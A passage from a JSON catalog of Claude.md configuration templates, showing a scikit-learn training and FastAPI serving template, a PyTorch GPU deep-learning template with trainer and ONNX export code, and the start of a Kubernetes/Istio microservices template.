print(f\"AUC Score: {auc_score:.4f}\")\n            print(f\"CV Mean: {cv_mean:.4f} (+/- {cv_std * 2:.4f})\")\n            print(\"\\nClassification Report:\")\n            print(classification_report(y_test, y_pred))\n            \n            return {\n                'model': model,\n                'accuracy': accuracy,\n                'auc_score': auc_score,\n                'cv_mean': cv_mean,\n                'cv_std': cv_std\n            }\n    \n    def hyperparameter_tuning(self, model, param_grid: Dict[str, list], \n                            X_train: pd.DataFrame, y_train: pd.Series) -> Any:\n        \"\"\"Perform hyperparameter tuning using GridSearchCV.\"\"\"\n        grid_search = GridSearchCV(\n            model, param_grid, cv=5, scoring='accuracy', n_jobs=-1, verbose=1\n        )\n        grid_search.fit(X_train, y_train)\n        \n        print(f\"Best parameters: {grid_search.best_params_}\")\n        print(f\"Best CV score: {grid_search.best_score_:.4f}\")\n        \n        return grid_search.best_estimator_\n    \n    def train_all_models(self, X_train: pd.DataFrame, X_test: pd.DataFrame,\n                        y_train: pd.Series, y_test: pd.Series) -> Dict[str, Dict[str, Any]]:\n        \"\"\"Train and compare multiple models.\"\"\"\n        models = self.prepare_models()\n        results = {}\n        \n        for name, model in models.items():\n            print(f\"\\nTraining {name}...\")\n            result = self.train_evaluate_model(model, X_train, X_test, y_train, y_test, name)\n            results[name] = result\n        \n        # Find best model\n        best_model_name = max(results.keys(), key=lambda x: results[x]['accuracy'])\n        self.best_model = results[best_model_name]['model']\n        \n        print(f\"\\nBest model: {best_model_name} with accuracy: {results[best_model_name]['accuracy']:.4f}\")\n        \n        return results\n    \n    def save_model(self, model, filepath: str) -> None:\n        \"\"\"Save trained model to disk.\"\"\"\n        Path(filepath).parent.mkdir(parents=True, exist_ok=True)\n        joblib.dump(model, filepath)\n        print(f\"Model saved to {filepath}\")\n\n# Usage example\ndef main():\n    \"\"\"Main training pipeline.\"\"\"\n    # Load processed data\n    df = pd.read_csv('../data/processed/features.csv')\n    \n    # Separate features and target\n    X = df.drop('target', axis=1)\n    y = df['target']\n    \n    # Split data\n    X_train, X_test, y_train, y_test = train_test_split(\n        X, y, test_size=0.2, random_state=42, stratify=y\n    )\n    \n    print(f\"Training set size: {X_train.shape}\")\n    print(f\"Test set size: {X_test.shape}\")\n    \n    # Train models\n    trainer = ModelTrainer(\"house_price_prediction\")\n    results = trainer.train_all_models(X_train, X_test, y_train, y_test)\n    \n    # Save best model\n    trainer.save_model(trainer.best_model, '../models/best_model.joblib')\n    \n    return results\n\nif __name__ == \"__main__\":\n    results = main()\n```\n\n### Model Deployment\n```python\n# src/models/predict_model.py\nimport joblib\nimport pandas as pd\nimport numpy as np\nfrom fastapi import FastAPI, HTTPException\nfrom pydantic import BaseModel\nfrom typing import List\nimport logging\n\n# Set up logging\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\n# Load trained model\nmodel = joblib.load('../models/best_model.joblib')\n\n# FastAPI app\napp = FastAPI(title=\"ML Model API\", version=\"1.0.0\")\n\nclass PredictionInput(BaseModel):\n    features: List[float]\n\nclass PredictionOutput(BaseModel):\n    prediction: float\n    probability: List[float]\n\n@app.post(\"/predict\", response_model=PredictionOutput)\nasync def predict(input_data: PredictionInput):\n    \"\"\"Make prediction using trained model.\"\"\"\n    try:\n        # Convert input to numpy array\n        features = np.array(input_data.features).reshape(1, -1)\n        \n        # Make prediction\n        prediction = model.predict(features)[0]\n        probability = model.predict_proba(features)[0].tolist()\n        \n        logger.info(f\"Prediction made: {prediction}\")\n        \n        return PredictionOutput(\n            prediction=float(prediction),\n            probability=probability\n        )\n    \n    except Exception as e:\n        logger.error(f\"Prediction error: {str(e)}\")\n        raise HTTPException(status_code=400, detail=str(e))\n\n@app.get(\"/health\")\nasync def health_check():\n    \"\"\"Health check endpoint.\"\"\"\n    return {\"status\": \"healthy\"}\n\n# Run with: uvicorn predict_model:app --reload\n```\n\n## Data Version Control\n\n- Use DVC for data versioning\n- Track large datasets and model artifacts\n- Create reproducible data pipelines\n- Share data across team members\n- Maintain data lineage\n\n## Model Tracking\n\n- Use MLflow for experiment tracking\n- Log hyperparameters and metrics\n- Compare model performance\n- Store model artifacts\n- Enable model deployment\n\n## Best Practices\n\n- Always validate data quality\n- Use cross-validation for model evaluation\n- Document data sources and transformations\n- Create automated testing for data pipelines\n- Monitor model performance in production",
      "tags": [
        {
          "tag": {
            "id": "python",
            "name": "python",
            "slug": "python"
          }
        },
        {
          "tag": {
            "id": "jupyter",
            "name": "jupyter",
            "slug": "jupyter"
          }
        },
        {
          "tag": {
            "id": "machine-learning",
            "name": "machine-learning",
            "slug": "machine-learning"
          }
        },
        {
          "tag": {
            "id": "pandas",
            "name": "pandas",
            "slug": "pandas"
          }
        },
        {
          "tag": {
            "id": "scikit-learn",
            "name": "scikit-learn",
            "slug": "scikit-learn"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 10,
        "copies": 204
      },
      "_count": {
        "votes": 10,
        "copies": 216
      },
      "difficulty": "INTERMEDIATE",
      "language": "Python",
      "framework": "Jupyter",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "pytorch-deep-learning",
      "title": "PyTorch Deep Learning + GPU",
      "slug": "pytorch-deep-learning-gpu",
      "tagline": "PyTorch configuration for advanced developers",
      "description": "Deep learning project setup with PyTorch, GPU acceleration, and modern ML practices for neural network development.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - PyTorch Deep Learning + GPU\n\n## Project Overview\n\nThis is a comprehensive deep learning project setup using PyTorch with GPU acceleration, modern neural network architectures, and MLOps practices for scalable deep learning development.\n\n## Technology Stack\n\n- **Deep Learning**: PyTorch 2.0+\n- **Language**: Python 3.9+\n- **GPU**: CUDA 11.8+ / ROCm (AMD)\n- **Data Processing**: torchvision, albumentations\n- **Visualization**: TensorBoard, wandb\n- **Model Serving**: TorchServe, ONNX\n- **Containers**: Docker with CUDA support\n\n## Project Structure\n\n```\n├── data/\n│   ├── raw/             # Original datasets\n│   ├── processed/       # Preprocessed datasets\n│   └── splits/          # Train/val/test splits\n├── src/\n│   ├── data/           # Data loading and preprocessing\n│   ├── models/         # Model architectures\n│   ├── training/       # Training loops and utilities\n│   ├── evaluation/     # Evaluation and metrics\n│   └── utils/          # Utility functions\n├── configs/            # Configuration files\n├── notebooks/          # Jupyter notebooks\n├── experiments/        # Experiment logs and outputs\n├── checkpoints/        # Model checkpoints\n└── docker/            # Docker configurations\n```\n\n## Development Guidelines\n\n### Code Style\n- Follow PyTorch Lightning patterns\n- Use type hints and docstrings\n- Implement proper error handling\n- Use configuration files for hyperparameters\n- Follow modular design principles\n\n### Deep Learning Best Practices\n- Use proper data augmentation\n- Implement learning rate scheduling\n- Use gradient clipping when needed\n- Monitor training with visualizations\n- Implement early stopping\n\n### GPU Optimization\n- Use mixed precision training\n- Optimize data loading with multiple workers\n- Use compiled models when possible\n- Monitor GPU utilization\n- Implement distributed training for large models\n\n## Key Commands\n\n- `python train.py --config configs/config.yaml` - Start training\n- `python evaluate.py --checkpoint path/to/model.pth` - Evaluate model\n- `tensorboard --logdir experiments/` - View training logs\n- `python -m torch.distributed.launch --nproc_per_node=2 train.py` - Multi-GPU training\n\n## Environment Setup\n\nCreate a `requirements.txt` file:\n```\n# Core PyTorch stack\ntorch==2.1.1\ntorchvision==0.16.1\ntorchaudio==2.1.1\npytorch-lightning==2.1.2\n\n# Data processing\nalbumentations==1.3.1\nopencv-python==4.8.1.78\npillow==10.1.0\nnumpy==1.24.3\npandas==2.1.4\n\n# Visualization and logging\ntensorboard==2.15.1\nwandb==0.16.0\nmatplotlib==3.7.2\nseaborn==0.12.2\n\n# Model optimization\ntorchmetrics==1.2.0\ntimm==0.9.12\ntransformers==4.36.0\n\n# Deployment\nonnx==1.15.0\nonnxruntime-gpu==1.16.3\ntorchserve==0.8.2\n\n# Development\njupyter==1.0.0\nblack==23.11.0\npytest==7.4.3\n```\n\n## Common Patterns\n\n### Data Loading and Preprocessing\n```python\n# src/data/dataset.py\nimport torch\nfrom torch.utils.data import Dataset, DataLoader\nimport torchvision.transforms as transforms\nimport albumentations as A\nfrom albumentations.pytorch import ToTensorV2\nimport cv2\nimport pandas as pd\nfrom pathlib import Path\nfrom typing import Tuple, Optional, Callable\n\nclass CustomDataset(Dataset):\n    \"\"\"Custom dataset class for image classification.\"\"\"\n    \n    def __init__(self, \n                 data_dir: str,\n                 csv_file: str,\n                 transform: Optional[Callable] = None,\n                 mode: str = 'train'):\n        self.data_dir = Path(data_dir)\n        self.df = pd.read_csv(csv_file)\n        self.transform = transform\n        self.mode = mode\n        \n    def __len__(self) -> int:\n        return len(self.df)\n    \n    def __getitem__(self, idx: int) -> Tuple[torch.Tensor, torch.Tensor]:\n        row = self.df.iloc[idx]\n        \n        # Load image\n        img_path = self.data_dir / row['image_path']\n        image = cv2.imread(str(img_path))\n        image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)\n        \n        # Load label\n        label = torch.tensor(row['label'], dtype=torch.long)\n        \n        # Apply transforms\n        if self.transform:\n            if isinstance(self.transform, A.Compose):\n                transformed = self.transform(image=image)\n                image = transformed['image']\n            else:\n                image = self.transform(image)\n        \n        return image, label\n\ndef get_transforms(image_size: int = 224, mode: str = 'train') -> A.Compose:\n    \"\"\"Get image transforms for training or validation.\"\"\"\n    if mode == 'train':\n        transform = A.Compose([\n            A.Resize(image_size, image_size),\n            A.HorizontalFlip(p=0.5),\n            A.VerticalFlip(p=0.2),\n            A.Rotate(limit=30, p=0.5),\n            A.RandomBrightnessContrast(p=0.5),\n            A.HueSaturationValue(p=0.3),\n            A.GaussNoise(p=0.2),\n            A.Normalize(\n                mean=[0.485, 0.456, 0.406],\n                std=[0.229, 0.224, 0.225]\n            ),\n            ToTensorV2()\n        ])\n    else:\n        transform = A.Compose([\n            A.Resize(image_size, image_size),\n            A.Normalize(\n                mean=[0.485, 0.456, 0.406],\n                std=[0.229, 0.224, 0.225]\n            ),\n            ToTensorV2()\n        ])\n    \n    return transform\n\ndef create_data_loaders(train_dataset: Dataset, \n                       val_dataset: Dataset,\n                       batch_size: int = 32,\n                       num_workers: int = 4) -> Tuple[DataLoader, DataLoader]:\n    \"\"\"Create training and validation data loaders.\"\"\"\n    train_loader = DataLoader(\n        train_dataset,\n        batch_size=batch_size,\n        shuffle=True,\n        num_workers=num_workers,\n        pin_memory=True,\n        persistent_workers=True\n    )\n    \n    val_loader = DataLoader(\n        val_dataset,\n        batch_size=batch_size,\n        shuffle=False,\n        num_workers=num_workers,\n        pin_memory=True,\n        persistent_workers=True\n    )\n    \n    return train_loader, val_loader\n```\n\n### Model Architecture\n```python\n# src/models/cnn_model.py\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport timm\nfrom typing import Optional\n\nclass CNNModel(nn.Module):\n    \"\"\"Custom CNN model with pretrained backbone.\"\"\"\n    \n    def __init__(self, \n                 model_name: str = 'resnet50',\n                 num_classes: int = 10,\n                 pretrained: bool = True,\n                 dropout: float = 0.2):\n        super(CNNModel, self).__init__()\n        \n        # Load pretrained backbone\n        self.backbone = timm.create_model(\n            model_name,\n            pretrained=pretrained,\n            num_classes=0,  # Remove classification head\n            global_pool=''  # Remove global pooling\n        )\n        \n        # Get feature size\n        with torch.no_grad():\n            dummy_input = torch.randn(1, 3, 224, 224)\n            features = self.backbone(dummy_input)\n            feature_size = features.view(features.size(0), -1).size(1)\n        \n        # Custom classification head\n        self.classifier = nn.Sequential(\n            nn.AdaptiveAvgPool2d((1, 1)),\n            nn.Flatten(),\n            nn.Dropout(dropout),\n            nn.Linear(feature_size, 512),\n            nn.ReLU(inplace=True),\n            nn.Dropout(dropout),\n            nn.Linear(512, num_classes)\n        )\n        \n    def forward(self, x: torch.Tensor) -> torch.Tensor:\n        features = self.backbone(x)\n        output = self.classifier(features)\n        return output\n\nclass AttentionBlock(nn.Module):\n    \"\"\"Self-attention block for improved feature representation.\"\"\"\n    \n    def __init__(self, in_channels: int):\n        super(AttentionBlock, self).__init__()\n        self.query_conv = nn.Conv2d(in_channels, in_channels // 8, 1)\n        self.key_conv = nn.Conv2d(in_channels, in_channels // 8, 1)\n        self.value_conv = nn.Conv2d(in_channels, in_channels, 1)\n        self.softmax = nn.Softmax(dim=-2)\n        self.gamma = nn.Parameter(torch.zeros(1))\n        \n    def forward(self, x: torch.Tensor) -> torch.Tensor:\n        batch_size, channels, height, width = x.size()\n        \n        # Generate query, key, value\n        query = self.query_conv(x).view(batch_size, -1, height * width)\n        key = self.key_conv(x).view(batch_size, -1, height * width)\n        value = self.value_conv(x).view(batch_size, -1, height * width)\n        \n        # Compute attention\n        attention = torch.bmm(query.permute(0, 2, 1), key)\n        attention = self.softmax(attention)\n        \n        # Apply attention to values\n        out = torch.bmm(value, attention.permute(0, 2, 1))\n        out = out.view(batch_size, channels, height, width)\n        \n        # Add residual connection\n        out = self.gamma * out + x\n        return out\n\nclass ResidualBlock(nn.Module):\n    \"\"\"Residual block with batch normalization.\"\"\"\n    \n    def __init__(self, in_channels: int, out_channels: int, stride: int = 1):\n        super(ResidualBlock, self).__init__()\n        \n        self.conv1 = nn.Conv2d(in_channels, out_channels, 3, stride, 1, bias=False)\n        self.bn1 = nn.BatchNorm2d(out_channels)\n        self.conv2 = nn.Conv2d(out_channels, out_channels, 3, 1, 1, bias=False)\n        self.bn2 = nn.BatchNorm2d(out_channels)\n        \n        self.shortcut = nn.Sequential()\n        if stride != 1 or in_channels != out_channels:\n            self.shortcut = nn.Sequential(\n                nn.Conv2d(in_channels, out_channels, 1, stride, bias=False),\n                nn.BatchNorm2d(out_channels)\n            )\n    \n    def forward(self, x: torch.Tensor) -> torch.Tensor:\n        residual = self.shortcut(x)\n        \n        out = F.relu(self.bn1(self.conv1(x)))\n        out = self.bn2(self.conv2(out))\n        out += residual\n        out = F.relu(out)\n        \n        return out\n```\n\n### Training Loop\n```python\n# src/training/trainer.py\nimport torch\nimport torch.nn as nn\nimport torch.optim as optim\nfrom torch.utils.data import DataLoader\nfrom torch.cuda.amp import GradScaler, autocast\nfrom torch.utils.tensorboard import SummaryWriter\nimport numpy as np\nfrom tqdm import tqdm\nfrom typing import Dict, List, Optional, Tuple\nimport wandb\nfrom pathlib import Path\n\nclass Trainer:\n    \"\"\"Training class with modern PyTorch features.\"\"\"\n    \n    def __init__(self,\n                 model: nn.Module,\n                 train_loader: DataLoader,\n                 val_loader: DataLoader,\n                 criterion: nn.Module,\n                 optimizer: optim.Optimizer,\n                 scheduler: Optional[optim.lr_scheduler._LRScheduler] = None,\n                 device: str = 'cuda',\n                 mixed_precision: bool = True,\n                 gradient_clip: float = 1.0,\n                 experiment_name: str = 'experiment'):\n        \n        self.model = model.to(device)\n        self.train_loader = train_loader\n        self.val_loader = val_loader\n        self.criterion = criterion\n        self.optimizer = optimizer\n        self.scheduler = scheduler\n        self.device = device\n        self.mixed_precision = mixed_precision\n        self.gradient_clip = gradient_clip\n        \n        # Initialize scaler for mixed precision\n        self.scaler = GradScaler() if mixed_precision else None\n        \n        # Initialize logging\n        self.writer = SummaryWriter(f'experiments/{experiment_name}')\n        self.best_val_acc = 0.0\n        self.train_losses = []\n        self.val_losses = []\n        self.val_accuracies = []\n        \n        # Compile model for better performance (PyTorch 2.0+)\n        if hasattr(torch, 'compile'):\n            self.model = torch.compile(self.model)\n    \n    def train_epoch(self) -> float:\n        \"\"\"Train for one epoch.\"\"\"\n        self.model.train()\n        running_loss = 0.0\n        num_batches = len(self.train_loader)\n        \n        progress_bar = tqdm(self.train_loader, desc='Training')\n        \n        for batch_idx, (data, targets) in enumerate(progress_bar):\n            data, targets = data.to(self.device), targets.to(self.device)\n            \n            self.optimizer.zero_grad()\n            \n            if self.mixed_precision:\n                with autocast():\n                    outputs = self.model(data)\n                    loss = self.criterion(outputs, targets)\n                \n                self.scaler.scale(loss).backward()\n                \n                # Gradient clipping\n                if self.gradient_clip > 0:\n                    self.scaler.unscale_(self.optimizer)\n                    torch.nn.utils.clip_grad_norm_(self.model.parameters(), self.gradient_clip)\n                \n                self.scaler.step(self.optimizer)\n                self.scaler.update()\n            else:\n                outputs = self.model(data)\n                loss = self.criterion(outputs, targets)\n                loss.backward()\n                \n                # Gradient clipping\n                if self.gradient_clip > 0:\n                    torch.nn.utils.clip_grad_norm_(self.model.parameters(), self.gradient_clip)\n                \n                self.optimizer.step()\n            \n            running_loss += loss.item()\n            \n            # Update progress bar\n            progress_bar.set_postfix({\n                'Loss': f'{loss.item():.4f}',\n                'LR': f'{self.optimizer.param_groups[0][\"lr\"]:.6f}'\n            })\n        \n        return running_loss / num_batches\n    \n    def validate_epoch(self) -> Tuple[float, float]:\n        \"\"\"Validate for one epoch.\"\"\"\n        self.model.eval()\n        running_loss = 0.0\n        correct = 0\n        total = 0\n        \n        with torch.no_grad():\n            for data, targets in tqdm(self.val_loader, desc='Validation'):\n                data, targets = data.to(self.device), targets.to(self.device)\n                \n                if self.mixed_precision:\n                    with autocast():\n                        outputs = self.model(data)\n                        loss = self.criterion(outputs, targets)\n                else:\n                    outputs = self.model(data)\n                    loss = self.criterion(outputs, targets)\n                \n                running_loss += loss.item()\n                \n                # Calculate accuracy\n                _, predicted = torch.max(outputs, 1)\n                total += targets.size(0)\n                correct += (predicted == targets).sum().item()\n        \n        val_loss = running_loss / len(self.val_loader)\n        val_acc = 100 * correct / total\n        \n        return val_loss, val_acc\n    \n    def train(self, epochs: int, save_dir: str = 'checkpoints') -> Dict[str, List[float]]:\n        \"\"\"Complete training loop.\"\"\"\n        Path(save_dir).mkdir(exist_ok=True)\n        \n        for epoch in range(epochs):\n            print(f'\\nEpoch {epoch+1}/{epochs}')\n            print('-' * 50)\n            \n            # Training phase\n            train_loss = self.train_epoch()\n            \n            # Validation phase\n            val_loss, val_acc = self.validate_epoch()\n            \n            # Update learning rate\n            if self.scheduler:\n                if isinstance(self.scheduler, optim.lr_scheduler.ReduceLROnPlateau):\n                    self.scheduler.step(val_loss)\n                else:\n                    self.scheduler.step()\n            \n            # Log metrics\n            self.writer.add_scalar('Loss/Train', train_loss, epoch)\n            self.writer.add_scalar('Loss/Validation', val_loss, epoch)\n            self.writer.add_scalar('Accuracy/Validation', val_acc, epoch)\n            self.writer.add_scalar('Learning_Rate', self.optimizer.param_groups[0]['lr'], epoch)\n            \n            # Log to wandb if available\n            if wandb.run:\n                wandb.log({\n                    'epoch': epoch,\n                    'train_loss': train_loss,\n                    'val_loss': val_loss,\n                    'val_acc': val_acc,\n                    'lr': self.optimizer.param_groups[0]['lr']\n                })\n            \n            # Save best model\n            if val_acc > self.best_val_acc:\n                self.best_val_acc = val_acc\n                torch.save({\n                    'epoch': epoch,\n                    'model_state_dict': self.model.state_dict(),\n                    'optimizer_state_dict': self.optimizer.state_dict(),\n                    'val_acc': val_acc,\n                    'val_loss': val_loss\n                }, f'{save_dir}/best_model.pth')\n                print(f'New best model saved with validation accuracy: {val_acc:.2f}%')\n            \n            # Store metrics\n            self.train_losses.append(train_loss)\n            self.val_losses.append(val_loss)\n            self.val_accuracies.append(val_acc)\n            \n            print(f'Train Loss: {train_loss:.4f}')\n            print(f'Val Loss: {val_loss:.4f}, Val Acc: {val_acc:.2f}%')\n        \n        self.writer.close()\n        \n        return {\n            'train_losses': self.train_losses,\n            'val_losses': self.val_losses,\n            'val_accuracies': self.val_accuracies\n        }\n\n# Usage example\ndef create_trainer(model, train_loader, val_loader, num_classes, device):\n    \"\"\"Create trainer with optimized settings.\"\"\"\n    criterion = nn.CrossEntropyLoss(label_smoothing=0.1)\n    \n    optimizer = optim.AdamW(\n        model.parameters(),\n        lr=1e-3,\n        weight_decay=1e-4,\n        betas=(0.9, 0.999)\n    )\n    \n    scheduler = optim.lr_scheduler.CosineAnnealingWarmRestarts(\n        optimizer,\n        T_0=10,\n        T_mult=2,\n        eta_min=1e-6\n    )\n    \n    trainer = Trainer(\n        model=model,\n        train_loader=train_loader,\n        val_loader=val_loader,\n        criterion=criterion,\n        optimizer=optimizer,\n        scheduler=scheduler,\n        device=device,\n        mixed_precision=True,\n        gradient_clip=1.0\n    )\n    \n    return trainer\n```\n\n### Model Deployment\n```python\n# src/deployment/inference.py\nimport torch\nimport torch.nn as nn\nimport torchvision.transforms as transforms\nimport onnx\nimport onnxruntime as ort\nimport numpy as np\nfrom PIL import Image\nfrom typing import List, Dict, Any\nimport json\n\nclass ModelInference:\n    \"\"\"Model inference class supporting PyTorch and ONNX.\"\"\"\n    \n    def __init__(self, model_path: str, model_type: str = 'pytorch'):\n        self.model_type = model_type\n        self.device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n        \n        if model_type == 'pytorch':\n            self.load_pytorch_model(model_path)\n        elif model_type == 'onnx':\n            self.load_onnx_model(model_path)\n        else:\n            raise ValueError(\"Model type must be 'pytorch' or 'onnx'\")\n    \n    def load_pytorch_model(self, model_path: str):\n        \"\"\"Load PyTorch model.\"\"\"\n        checkpoint = torch.load(model_path, map_location=self.device)\n        \n        # Assuming model architecture is saved or can be reconstructed\n        from src.models.cnn_model import CNNModel\n        self.model = CNNModel(num_classes=10)  # Adjust based on your model\n        self.model.load_state_dict(checkpoint['model_state_dict'])\n        self.model.to(self.device)\n        self.model.eval()\n    \n    def load_onnx_model(self, model_path: str):\n        \"\"\"Load ONNX model.\"\"\"\n        providers = ['CUDAExecutionProvider', 'CPUExecutionProvider']\n        self.ort_session = ort.InferenceSession(model_path, providers=providers)\n        self.input_name = self.ort_session.get_inputs()[0].name\n        self.output_name = self.ort_session.get_outputs()[0].name\n    \n    def preprocess(self, image: Image.Image) -> torch.Tensor:\n        \"\"\"Preprocess image for inference.\"\"\"\n        transform = transforms.Compose([\n            transforms.Resize((224, 224)),\n            transforms.ToTensor(),\n            transforms.Normalize(\n                mean=[0.485, 0.456, 0.406],\n                std=[0.229, 0.224, 0.225]\n            )\n        ])\n        \n        return transform(image).unsqueeze(0)\n    \n    def predict(self, image: Image.Image) -> Dict[str, Any]:\n        \"\"\"Make prediction on single image.\"\"\"\n        input_tensor = self.preprocess(image)\n        \n        if self.model_type == 'pytorch':\n            with torch.no_grad():\n                input_tensor = input_tensor.to(self.device)\n                outputs = self.model(input_tensor)\n                probabilities = torch.softmax(outputs, dim=1)\n                predicted_class = torch.argmax(probabilities, dim=1).item()\n                confidence = probabilities[0][predicted_class].item()\n        \n        elif self.model_type == 'onnx':\n            input_array = input_tensor.numpy()\n            outputs = self.ort_session.run([self.output_name], {self.input_name: input_array})\n            probabilities = torch.softmax(torch.tensor(outputs[0]), dim=1)\n            predicted_class = torch.argmax(probabilities, dim=1).item()\n            confidence = probabilities[0][predicted_class].item()\n        \n        return {\n            'predicted_class': predicted_class,\n            'confidence': confidence,\n            'probabilities': probabilities[0].tolist()\n        }\n    \n    def batch_predict(self, images: List[Image.Image]) -> List[Dict[str, Any]]:\n        \"\"\"Make predictions on batch of images.\"\"\"\n        results = []\n        for image in images:\n            result = self.predict(image)\n            results.append(result)\n        return results\n\ndef export_to_onnx(model: nn.Module, input_shape: tuple, output_path: str):\n    \"\"\"Export PyTorch model to ONNX format.\"\"\"\n    model.eval()\n    dummy_input = torch.randn(1, *input_shape)\n    \n    torch.onnx.export(\n        model,\n        dummy_input,\n        output_path,\n        export_params=True,\n        opset_version=11,\n        do_constant_folding=True,\n        input_names=['input'],\n        output_names=['output'],\n        dynamic_axes={\n            'input': {0: 'batch_size'},\n            'output': {0: 'batch_size'}\n        }\n    )\n    \n    print(f\"Model exported to {output_path}\")\n```\n\n## GPU Optimization\n\n- Use CUDA for GPU acceleration\n- Implement mixed precision training\n- Optimize data loading with pin_memory\n- Use multiple GPUs with DataParallel/DistributedDataParallel\n- Monitor GPU memory usage\n\n## Experiment Tracking\n\n- Use TensorBoard for training visualization\n- Integrate with Weights & Biases\n- Log hyperparameters and metrics\n- Track model checkpoints\n- Compare experiment results\n\n## Model Deployment\n\n- Export models to ONNX format\n- Use TorchServe for production serving\n- Implement proper model versioning\n- Add monitoring and logging\n- Use containerization with Docker",
      "tags": [
        {
          "tag": {
            "id": "python",
            "name": "python",
            "slug": "python"
          }
        },
        {
          "tag": {
            "id": "pytorch",
            "name": "pytorch",
            "slug": "pytorch"
          }
        },
        {
          "tag": {
            "id": "deep-learning",
            "name": "deep-learning",
            "slug": "deep-learning"
          }
        },
        {
          "tag": {
            "id": "neural-networks",
            "name": "neural-networks",
            "slug": "neural-networks"
          }
        },
        {
          "tag": {
            "id": "gpu",
            "name": "gpu",
            "slug": "gpu"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 46,
        "copies": 208
      },
      "_count": {
        "votes": 42,
        "copies": 53
      },
      "difficulty": "ADVANCED",
      "language": "Python",
      "framework": "PyTorch",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "microservices-architecture",
      "title": "Microservices Architecture + Service Mesh",
      "slug": "microservices-architecture-service-mesh",
      "tagline": "Kubernetes + Istio configuration for advanced developers",
      "description": "Complete microservices architecture setup with service mesh, API gateway, service discovery, and distributed communication patterns.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Microservices Architecture + Service Mesh\n\n## Project Overview\n\nThis is a comprehensive microservices architecture implementation using Kubernetes, Istio service mesh, and modern distributed systems patterns. The setup includes API gateway, service discovery, inter-service communication, and observability.\n\n## Technology Stack\n\n- **Orchestration**: Kubernetes\n- **Service Mesh**: Istio\n- **API Gateway**: Istio Gateway + Envoy Proxy\n- **Service Discovery**: Kubernetes DNS + Istio\n- **Communication**: gRPC, REST, Message Queues\n- **Observability**: Jaeger, Prometheus, Grafana\n- **Security**: mTLS, RBAC, Network Policies\n\n## Architecture Patterns\n\n### 1. Domain-Driven Design (DDD)\n- Organize services by business domains\n- Define clear bounded contexts\n- Implement domain models and aggregates\n- Use ubiquitous language across teams\n\n### 2. Service Communication Patterns\n- **Synchronous**: REST APIs, gRPC\n- **Asynchronous**: Event-driven messaging\n- **Request-Response**: Direct service calls\n- **Publish-Subscribe**: Event notifications\n\n### 3. Data Management Patterns\n- Database per service\n- Saga pattern for distributed transactions\n- Event sourcing for audit trails\n- CQRS for read/write separation\n\n## Project Structure\n\n```\nmicroservices-platform/\n├── services/\n│   ├── user-service/        # User management microservice\n│   ├── product-service/     # Product catalog microservice\n│   ├── order-service/       # Order processing microservice\n│   ├── payment-service/     # Payment processing microservice\n│   └── notification-service/ # Notification microservice\n├── infrastructure/\n│   ├── kubernetes/          # K8s manifests\n│   ├── istio/              # Service mesh configuration\n│   ├── monitoring/         # Observability stack\n│   └── security/           # Security policies\n├── api-gateway/            # API Gateway configuration\n├── shared/\n│   ├── proto/              # gRPC protocol definitions\n│   ├── events/             # Event schemas\n│   └── libraries/          # Shared libraries\n└── tools/\n    ├── migrations/         # Database migrations\n    ├── scripts/            # Deployment scripts\n    └── testing/            # Integration tests\n```\n\n## Development Guidelines\n\n### Service Design Principles\n- Single Responsibility: Each service owns one business capability\n- Loose Coupling: Minimize dependencies between services\n- High Cohesion: Related functionality grouped together\n- Autonomous: Services can be developed and deployed independently\n\n### API Design Standards\n- Use RESTful conventions for external APIs\n- Implement gRPC for internal service communication\n- Version APIs properly (v1, v2, etc.)\n- Follow OpenAPI specifications\n- Implement proper error handling and status codes\n\n### Data Consistency\n- Embrace eventual consistency\n- Use distributed transactions sparingly\n- Implement compensation patterns (Saga)\n- Design for idempotency\n- Handle partial failures gracefully\n\n## Service Implementation Examples\n\n### User Service (Node.js + Express)\n```typescript\n// services/user-service/src/app.ts\nimport express from 'express';\nimport { UserController } from './controllers/UserController';\nimport { UserRepository } from './repositories/UserRepository';\nimport { UserService } from './services/UserService';\nimport { DatabaseConnection } from './infrastructure/database';\n\nconst app = express();\napp.use(express.json());\n\n// Dependency injection\nconst database = new DatabaseConnection();\nconst userRepository = new UserRepository(database);\nconst userService = new UserService(userRepository);\nconst userController = new UserController(userService);\n\n// Routes\napp.get('/health', (req, res) => res.json({ status: 'healthy' }));\napp.get('/users/:id', userController.getUser.bind(userController));\napp.post('/users', userController.createUser.bind(userController));\napp.put('/users/:id', userController.updateUser.bind(userController));\n\n// Error handling middleware\napp.use((error: Error, req: express.Request, res: express.Response, next: express.NextFunction) => {\n  console.error('Service error:', error);\n  res.status(500).json({ error: 'Internal service error' });\n});\n\nconst PORT = process.env.PORT || 3001;\napp.listen(PORT, () => {\n  console.log(`User service running on port ${PORT}`);\n});\n```\n\n### Service-to-Service Communication\n```typescript\n// shared/libraries/service-client.ts\nimport axios, { AxiosInstance } from 'axios';\n\nexport class ServiceClient {\n  private client: AxiosInstance;\n\n  constructor(baseURL: string, serviceName: string) {\n    this.client = axios.create({\n      baseURL,\n      timeout: 5000,\n      headers: {\n        'Content-Type': 'application/json',\n        'X-Service-Name': serviceName\n      }\n    });\n\n    // Add request interceptor for tracing\n    this.client.interceptors.request.use((config) => {\n      const traceId = this.generateTraceId();\n      config.headers['X-Trace-ID'] = traceId;\n      return config;\n    });\n\n    // Add response interceptor for error handling\n    this.client.interceptors.response.use(\n      (response) => response,\n      (error) 